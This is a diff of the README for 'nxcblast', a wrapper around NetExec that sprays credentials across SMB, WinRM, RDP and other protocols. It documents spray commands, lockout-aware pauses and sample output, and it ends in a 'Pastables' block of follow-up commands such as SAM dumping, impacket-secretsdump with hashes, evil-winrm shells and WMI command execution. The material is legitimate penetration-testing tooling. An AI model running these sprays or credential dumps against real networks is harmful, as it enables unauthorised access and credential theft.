@@ -2,7 +2,7 @@
 
 Spray credentials across every NetExec protocol at once -- hits only, lockout-aware, pastables on finish.
 
-`nxcblast` is a thin Python wrapper around [`nxc`](https://github.com/Pennyw0rth/NetExec). It does **not** reimplement SMB, WinRM, RDP, or any other protocol; every auth attempt is a real `nxc` subprocess. Console output is signal, not noise: you see hits, lockout warnings, and a live progress indicator. Full verbose `nxc` output lands in a log file. When the spray finishes, you get a **Pastables** block -- one ready-to-run follow-up command per confirmed hit -- that you execute yourself.
+`nxcblast` is a thin Python wrapper around [`nxc`](https://github.com/Pennyw0rth/NetExec). It does **not** reimplement SMB, WinRM, RDP, or any other protocol; every auth attempt is a real `nxc` subprocess. Console output is signal, not noise: you see hits (with nxc-style access-level colors), a column header, and a live progress bar. Full verbose `nxc` output lands in a log file. When the spray finishes, you get a **Pastables** block -- ready-to-run follow-up commands grouped per protocol for each confirmed hit -- that you execute yourself.
 
 Inspired by [nxcspray](https://github.com/NTHSec/nxcspray) by NTHSec. `nxcspray` proved the "one command, every protocol" workflow; `nxcblast` takes that idea and adds hits-only output, lockout awareness, `nxcdb` reuse, hash/null/guest auth, and pastable follow-ups.
 
@@ -12,19 +12,16 @@ Inspired by [nxcspray](https://github.com/NTHSec/nxcspray) by NTHSec. `nxcspray`
 
 ```bash
 # wget
-sudo wget -q https://raw.githubusercontent.com/brandonwhitmire/nxcblast/main/nxcblast.py \
-  -O /usr/local/bin/nxcblast && sudo chmod +x /usr/local/bin/nxcblast
+sudo wget -q https://raw.githubusercontent.com/brandonwhitmire/nxcblast/main/nxcblast.py -O /usr/local/bin/nxcblast && sudo chmod +x /usr/local/bin/nxcblast
 
 # curl alternative
-sudo curl -fsSL https://raw.githubusercontent.com/brandonwhitmire/nxcblast/main/nxcblast.py \
-  -o /usr/local/bin/nxcblast && sudo chmod +x /usr/local/bin/nxcblast
+sudo curl -fsSL https://raw.githubusercontent.com/brandonwhitmire/nxcblast/main/nxcblast.py -o /usr/local/bin/nxcblast && sudo chmod +x /usr/local/bin/nxcblast
 ```
 
 Or run it from the repo:
 
 ```bash
-chmod +x nxcblast.py
-./nxcblast.py -h
+python3 nxcblast.py -h
 ```
 
 ## Usage
@@ -35,15 +32,17 @@ nxcblast [protocols] [targets] [auth] [options]
 
 **Protocols** (positional or `--protocols`): `smb`, `winrm`, `rdp`, `ssh`, `ftp`, `ldap`, `mssql`, `vnc`, `wmi`. Use `all` or omit them to hit every protocol. Space-separated, comma-separated, or mixed.
 
-**Targets**: a file of IPs/ranges (comments and blank lines ignored), a single host/IP, or a CIDR range.
+**Targets**: one or more hosts, like `nxc` -- space-separated, comma-separated, mixed, a file of IPs/ranges (comments and blank lines ignored), a CIDR, or an nxc-style range (`192.168.1.10-20`).
 
-`nxcblast` refuses to start without an explicit target **and** at least one auth method.
+`nxcblast` refuses to start without an explicit target. If you pass `-u`/`-U` with no password or hash, it defaults to `--user-only`. If you pass neither user nor password, it defaults to `--null`, `--null-user`, and `--guest`.
 
 ### Password spray
 
 ```bash
 nxcblast smb,winrm targets.txt -u admin -p Password1
 nxcblast smb rdp 10.10.10.5 -u admin -p 'Password1'
+nxcblast 192.168.1.10 192.168.1.11 -u admin -p Password1
+nxcblast 192.168.1.10,192.168.1.11 -u admin -p Password1
 nxcblast targets.txt -u admin -p Password1          # no protocols = all
 nxcblast all 192.168.1.0/24 -u admin -p Password1
 nxcblast --protocols smb,ldap targets.txt -u admin -p Password1
@@ -82,6 +81,8 @@ nxcblast smb,winrm targets.txt --creds creds.txt
 ### Null, guest, user-only, local (additive -- combine freely)
 
 ```bash
+nxcblast smb 192.168.1.5                    # no user/pass: null + guest
+nxcblast smb 192.168.1.5 -u admin           # no password: user-only (admin:'')
 nxcblast smb 192.168.1.0/24 --null
 nxcblast smb targets.txt --null --guest
 nxcblast smb targets.txt -u admin --user-only
@@ -93,8 +94,8 @@ nxcblast all targets.txt --null --guest --null-user -u admin --user-only
 |---|---|
 | `--null` / `--null-user` | `-u '' -p ''` |
 | `--guest` | `-u guest -p ''` |
-| `--user-only` | `-u <USER> -p ''` (needs `-u`/`-U`) |
-| `--local` | `--local-auth` on smb/winrm/wmi/rdp |
+| `--user-only` | `-u <USER> -p ''` (needs `-u`/`-U`; implied when `-u`/`-U` has no secret) |
+| `--local` | `--local-auth` on smb/winrm/wmi/rdp (also tried automatically for null/guest/user-only) |
 
 ### MSSQL auth variants
 
@@ -138,17 +139,20 @@ nxcblast smb targets.txt -u admin -p Password1 --quiet
 Hits only. Failures, banners, and nxc chatter stay in the log.
 
 ```
-[*] nxcblast | protocols: smb,winrm,rdp | targets: 12 | creds: 3
-[*] Starting spray... (lockout threshold: 3)
+[*] nxcblast | protocols: smb,winrm,rdp,ssh,ftp,ldap,mssql,vnc,wmi | targets: 1 | creds: 1
+[*] Verbose log: nxcblast_20260902_224305.log
+[*] Ctrl+C skips this target during a pause; Ctrl+C otherwise stops the spray
 
-[+] SMB    | 10.10.10.5     | admin:Password1        | (Pwn3d!)
-[+] WINRM  | 10.10.10.5     | admin:Password1        | (Shell)
-[+] SMB    | 10.10.10.8     | guest:                 | (READ ONLY)
+    PROTO  | TARGET           | CREDS                  | ACCESS
 
-[!] LOCKOUT WARNING: 10.10.10.10 | 3 attempts reached | pausing 60s
+[+] SMB    | 192.168.59.203   | jason:lab              | (valid)
+[+] RDP    | 192.168.59.203   | jason:lab              | (Pwn3d!) RDP code exec
+[+] WMI    | 192.168.59.203   | jason:lab              | (valid)
 
-[*] Done. 3 hits across 2 targets.
+[*] Done. 3 hits across 1 target.
 ```
+
+`(valid)` is green. `(Pwn3d!)` is bright red, with a short protocol-specific meaning (local admin, remote shell, sysadmin role, and so on). FTP never shows `Pwn3d!`. Lockout pauses are silent on the console (logged only).
 
 Hit detection reads `nxc` stdout (exit codes are ignored): `[+]`, `Pwn3d!`, `STATUS_SUCCESS`, `(Shell)`. Lines with `STATUS_LOGON_FAILURE`, `STATUS_ACCESS_DENIED`, or `[-]` are dropped.
 
@@ -161,22 +165,26 @@ Hit detection reads `nxc` stdout (exit codes are ignored): `[+]`, `Pwn3d!`, `STA
 PASTABLES -- confirmed hits, suggested follow-up commands
 ============================================================
 
-[10.10.10.5 | admin:Password1]
-  nxc smb 10.10.10.5 -u admin -p 'Password1' --shares
-  nxc smb 10.10.10.5 -u admin -p 'Password1' --rid-brute
-  nxc smb 10.10.10.5 -u admin -p 'Password1' --sam
-  nxc smb 10.10.10.5 -u admin -p 'Password1' --local-auth --shares
-  evil-winrm -i 10.10.10.5 -u admin -p 'Password1'
+[192.168.59.203 | jason:lab]
 
-[10.10.10.5 | admin::aad3b435...:HASH]
-  nxc smb 10.10.10.5 -u admin -H aad3b435...:HASH
-  impacket-secretsdump admin@10.10.10.5 -hashes aad3b435...:HASH
-  evil-winrm -i 10.10.10.5 -u admin -H HASH
+[SMB]
+  nxc smb 192.168.59.203 -u jason -p 'lab' --shares
+  nxc smb 192.168.59.203 -u jason -p 'lab' --rid-brute
+  nxc smb 192.168.59.203 -u jason -p 'lab' --sam
+  nxc smb 192.168.59.203 -u jason -p 'lab' --local-auth --shares
 
-[10.10.10.10 | rdp | admin:Password1]
-  xfreerdp /u:admin /p:'Password1' /v:10.10.10.10
+[WINRM]
+  evil-winrm -i 192.168.59.203 -u jason -p 'lab'
+
+[RDP]
+  xfreerdp /u:jason /p:'lab' /v:192.168.59.203 /cert:ignore
+
+[WMI]
+  nxc wmi 192.168.59.203 -u jason -p 'lab' -x whoami
 ============================================================
 ```
+
+Commands are grouped by protocol and only included for protocols that actually hit. If there are no confirmed hits, the Pastables block is omitted.
 
 You run these. The tool does not.
 
@@ -190,8 +198,8 @@ The current workspace is taken from `~/.nxc/nxc.conf` (or `NXC_PATH` if you relo
 
 This is a **soft guard**, not a password-policy oracle.
 
-- Attempts are counted per `(target, domain)` across every protocol.
-- At `--lockout N` (default 3), nxcblast prints a warning and pauses `--lockout-delay S` seconds (default 60).
+- Unique credentials are counted per `(target, domain)`. The same password across SMB, WinRM, RDP, etc. counts as one attempt.
+- At `--lockout N` (default 3 unique creds), nxcblast pauses `--lockout-delay S` seconds (default 60). The pause is silent on the console; the Ctrl+C hint is printed once at the top.
 - Ctrl+C **during the pause** skips the rest of that target and continues the spray.
 - Ctrl+C **any other time** stops the run and still prints Pastables for hits already found.
 - `--lockout 0` disables the pause.
@@ -202,6 +210,6 @@ You own lockout policy. Check `--pass-pol` / domain policy yourself, size `--loc
 
 - Never auto-runs enum modules -- pastables only.
 - Never implements protocol logic -- always delegates to `nxc`.
-- Refuses to run without an explicit target and at least one auth method.
+- Refuses to run without an explicit target. Missing passwords fall back to user-only / null / guest rather than erroring.
 - Verifies `nxc` is on `PATH` at startup and exits clearly if it is not.
 - stdlib only -- no third-party Python dependencies.
